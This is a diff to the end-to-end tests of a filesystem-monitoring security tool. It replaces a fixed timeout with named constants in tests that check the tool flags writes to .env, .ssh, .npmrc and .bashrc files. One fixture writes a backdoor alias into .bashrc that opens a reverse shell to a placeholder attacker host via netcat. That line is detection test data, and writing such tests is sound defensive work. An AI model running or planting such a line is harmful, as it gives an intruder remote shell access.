@@ -13,6 +13,8 @@ import * as os from 'os';
 import { describeWithCapability } from '../harness/capabilities';
 import { createAdapter } from '../harness/create-adapter';
 import {
+  DETECTION_CASE_TIMEOUT_MS,
+  DETECTION_WAIT_MS,
   detectWrite,
   endWatchCase,
   fileEventFor,
@@ -38,8 +40,10 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
 
   /**
    * The product's event for the write of `name`, awaited for `timeoutMs`
-   * from the write as before. When the product reports nothing in time, the
-   * case fails if the harness's own watcher saw the path in that time (the
+   * from the write: each case passes DETECTION_WAIT_MS, and has
+   * DETECTION_CASE_TIMEOUT_MS to finish in, so a host under load has longer
+   * than the 5000 ms that timed out to deliver the event. When the product
+   * reports nothing in time, the case fails if the harness's own watcher saw the path in that time (the
    * host delivered the event) and is skipped as inconclusive if it saw
    * nothing (the host delivered no event to this process). A detection case
    * never passes without the product's own event, and records that it got
@@ -110,7 +114,7 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     fs.writeFileSync(envPath, 'SECRET_KEY=test123\n');
 
     // Wait for the filesystem monitor to pick it up
-    const event = await detect(ctx, '.env', isSensitiveFileEvent, 5000);
+    const event = await detect(ctx, '.env', isSensitiveFileEvent, DETECTION_WAIT_MS);
 
     expect(event).toBeDefined();
     expect(event.source).toBe('filesystem');
@@ -118,7 +122,7 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     expect(event.severity).toBe('high');
     expect(event.data?.sensitive).toBe(true);
     expect(String(event.data?.path)).toContain('.env');
-  });
+  }, DETECTION_CASE_TIMEOUT_MS);
 
   it('should detect creation of a .ssh directory file as sensitive', async (ctx) => {
     // Create a .ssh subdirectory and a key file
@@ -126,36 +130,36 @@ describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detect
     fs.mkdirSync(sshDir, { recursive: true });
     fs.writeFileSync(path.join(sshDir, 'id_rsa'), 'fake-private-key\n');
 
-    const event = await detect(ctx, '.ssh', fileEventFor('.ssh'), 5000);
+    const event = await detect(ctx, '.ssh', fileEventFor('.ssh'), DETECTION_WAIT_MS);
 
     expect(event).toBeDefined();
     expect(event.category).toBe('violation');
     expect(event.severity).toBe('high');
     expect(event.data?.sensitive).toBe(true);
-  });
+  }, DETECTION_CASE_TIMEOUT_MS);
 
   it('should detect .bashrc write as persistence attempt', async (ctx) => {
     const bashrcPath = path.join(watchDir, '.bashrc');
     fs.writeFileSync(bashrcPath, 'alias backdoor="nc -e /bin/sh attacker.com 4444"\n');
 
-    const event = await detect(ctx, '.bashrc', fileEventFor('.bashrc'), 5000);
+    const event = await detect(ctx, '.bashrc', fileEventFor('.bashrc'), DETECTION_WAIT_MS);
 
     expect(event).toBeDefined();
     expect(event.category).toBe('violation');
     expect(event.severity).toBe('high');
-  });
+  }, DETECTION_CASE_TIMEOUT_MS);
 
   it('should detect .npmrc credential file access', async (ctx) => {
     const npmrcPath = path.join(watchDir, '.npmrc');
     fs.writeFileSync(npmrcPath, '//registry.npmjs.org/:_authToken=npm_FAKE\n');
 
-    const event = await detect(ctx, '.npmrc', fileEventFor('.npmrc'), 5000);
+    const event = await detect(ctx, '.npmrc', fileEventFor('.npmrc'), DETECTION_WAIT_MS);
 
     expect(event).toBeDefined();
     expect(event.category).toBe('violation');
     expect(event.severity).toBe('high');
     expect(event.data?.sensitive).toBe(true);
-  });
+  }, DETECTION_CASE_TIMEOUT_MS);
 
   it('should allow normal file creation without triggering violations', async () => {
     // Create a normal, non-sensitive file
